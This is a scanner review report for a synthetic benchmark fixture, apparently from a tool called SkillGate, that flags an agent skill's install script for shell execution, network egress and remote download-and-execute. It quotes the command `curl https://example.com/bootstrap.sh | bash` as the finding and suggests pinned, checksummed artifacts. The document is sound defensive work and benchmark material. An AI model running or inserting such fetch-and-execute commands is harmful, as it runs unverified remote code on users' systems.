# Remote Download Review Item

## Source

- Input: `fixtures/benchmark/05-remote-download-execute`
- Source identity:
  - `SKILL.md` SHA-256 `792648b958c151b00f1e89e9117f02379113ebfd1385ecc24fc9574ae04cc06c`
  - `scripts/install.sh` SHA-256 `9809a9df36f7d7f340a859a650fa4fdb5b3bc8c359e622ad57df04f2cd409089`
- Scanner version: `0.1.1`

## Command

```bash
skillgate scan fixtures/benchmark/05-remote-download-execute --format json
```

## Capability Inventory

- `network_egress`: `example.com`
- `remote_download_execution`: `example.com`
- `shell_execution`: script shebang and `curl ... | bash`

## Findings Summary

- Findings: `4`
- High findings: `2`
- Medium findings: `2`
- Rule IDs: `SG001`, `SG003`, `SG004`

## Finding Classification

- `SG001` shell execution on the script shebang: expected behavior for a shell
  helper script, but still a capability to review.
- `SG001` shell execution on `curl https://example.com/bootstrap.sh | bash`:
  review item because it executes content through a shell.
- `SG003` network egress to `example.com`: review item because installation
  reaches a remote host.
- `SG004` remote download followed by execution: review item and likely blocker
  unless the downloaded artifact is pinned, verified, and intentionally approved.

## Suggested Policy Direction

Prefer replacing remote execution with a pinned, checksummed artifact or a local
reviewed helper script. If the behavior is intentional, approve the exact host
and command through durable policy rather than waiving the finding indefinitely.

## Limitations

This fixture is synthetic and reduced. It demonstrates a common pattern but is
not copied from an upstream project and does not prove that `example.com` serves
malicious content.

## What SkillGate Cannot Conclude

SkillGate does not download the URL, inspect the remote script, execute the
installer, or determine whether the remote host is trustworthy.
